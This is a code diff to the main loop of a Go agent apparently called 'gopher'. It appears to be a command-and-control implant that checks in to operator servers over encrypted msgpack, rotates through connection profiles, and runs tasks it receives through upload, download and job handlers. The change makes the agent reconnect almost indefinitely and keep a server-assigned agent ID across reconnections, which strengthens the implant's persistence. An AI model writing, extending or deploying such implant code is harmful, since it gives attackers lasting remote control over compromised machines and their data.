@@ -4,6 +4,7 @@ import (
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/binary"
 	"gopher/daemon"
 	"gopher/functions"
 	"gopher/utils"
@@ -121,16 +122,27 @@ func main() {
 
 	AgentId = 0
 
-	initData, _ := msgpack.Marshal(utils.InitPack{Type: profile.Type, Data: sessionInfo})
-	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
-	initMsg, _ = utils.EncryptData(initMsg, encKey)
+	buildStartMsg := func() []byte {
+		initData, _ := msgpack.Marshal(utils.InitPack{Type: profile.Type, Data: sessionInfo, Id: AgentId})
+		msg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
+		msg, _ = utils.EncryptData(msg, encKey)
+		return msg
+	}
+	initMsg := buildStartMsg()
 
 	UPLOADS = make(map[string][]byte)
 	DOWNLOADS = make(map[string]utils.Connection)
 	JOBS = make(map[string]utils.Connection)
 
 	addrIndex := 0
-	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
+	connCount := profile.ConnCount
+	if connCount < 1 {
+		connCount = 1 << 30
+	}
+	if profile.ConnTimeout < 1 {
+		profile.ConnTimeout = 10
+	}
+	for i := 0; i < connCount && ACTIVE; i++ {
 		if i > 0 {
 			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
 			addrIndex++
@@ -139,14 +151,8 @@ func main() {
 				profileIndex = (profileIndex + 1) % len(profiles)
 				profile = profiles[profileIndex]
 				encKey = encKeys[profileIndex]
-				if AgentId == 0 {
-					initData, _ = msgpack.Marshal(utils.InitPack{Type: profile.Type, Data: sessionInfo})
-				} else {
-					initData, _ = msgpack.Marshal(utils.ResumePack{Id: AgentId})
-				}
-				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
-				initMsg, _ = utils.EncryptData(initMsg, encKey)
 			}
+			initMsg = buildStartMsg()
 		}
 
 		///// Connect
@@ -191,13 +197,21 @@ func main() {
 
 		/// Send Init
 		_ = functions.SendMsg(conn, initMsg)
-
-		/// Recv Command
+		recvData, err := functions.RecvMsg(conn)
+		if err != nil {
+			_ = conn.Close()
+			continue
+		}
+		recvData, err = utils.DecryptData(recvData, sessionKey)
+		if err != nil || len(recvData) < 8 {
+			_ = conn.Close()
+			continue
+		}
+		AgentId = int64(binary.BigEndian.Uint64(recvData[:8]))
 
 		var (
 			inMessage  utils.Message
 			outMessage utils.Message
-			recvData   []byte
 			sendData   []byte
 		)
 
@@ -206,23 +220,18 @@ func main() {
 			if err != nil {
 				break
 			}
-
-			outMessage = utils.Message{Type: 0}
 			recvData, err = utils.DecryptData(recvData, sessionKey)
 			if err != nil {
 				break
 			}
-
-			err = msgpack.Unmarshal(recvData, &inMessage)
-			if err != nil {
+			if err = msgpack.Unmarshal(recvData, &inMessage); err != nil {
 				break
 			}
-
+			outMessage = utils.Message{Type: 0}
 			if inMessage.Type == 1 {
 				outMessage.Type = 1
 				outMessage.Object = TaskProcess(inMessage.Object)
 			}
-
 			sendData, _ = msgpack.Marshal(outMessage)
 			sendData, _ = utils.EncryptData(sendData, sessionKey)
 			_ = functions.SendMsg(conn, sendData)
